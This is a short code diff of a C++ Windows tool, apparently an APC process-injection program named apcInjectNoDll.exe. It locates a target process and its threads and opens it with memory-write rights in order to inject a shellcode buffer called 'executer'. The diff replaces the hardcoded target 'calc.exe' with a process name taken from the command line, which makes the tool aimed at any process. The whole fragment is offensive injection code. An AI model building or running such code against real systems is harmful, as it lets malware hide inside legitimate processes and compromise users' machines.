@@ -50,14 +50,13 @@ bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
     return pid > 0 && !tids.empty();
 }
 
-void main()
-{
+void inject(char* process){
 	DWORD pid;
 	vector<DWORD> tids;
 	LPVOID exe = executer;
 	ULONG size = sizeof(executer);
 
-	if (FindProcess("calc.exe", pid, tids)) {
+	if (FindProcess(process, pid, tids)) {
 		HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
 		if(hProcess==NULL){
 			cout<<"[!] failed to get handle for process: "<<pid<<endl;
@@ -117,4 +116,13 @@ void main()
 	else{
 		cout<<"[!] specified process not found"<<endl;
 	}
+}
+
+void main(int argc, char* argv[]){
+    if(argc!=2){
+        cout<<"Usage: apcInjectNoDll.exe process"<<endl;
+        return;
+    }
+    inject(argv[1]);
+    return;
 }
